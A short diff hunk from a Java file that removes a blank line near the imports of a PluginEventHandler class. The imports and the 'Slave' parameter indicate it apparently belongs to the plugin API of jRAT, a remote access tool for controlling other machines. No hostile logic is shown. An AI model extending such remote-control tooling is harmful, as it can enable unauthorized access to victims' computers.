@@ -7,7 +7,6 @@ import pro.jrat.api.events.OnDisconnectEvent;
 import pro.jrat.api.events.OnPacketEvent;
 import pro.jrat.api.events.OnSendPacketEvent;
 
-
 public class PluginEventHandler {
 
 	public static void onPacket(Slave slave, byte header) {
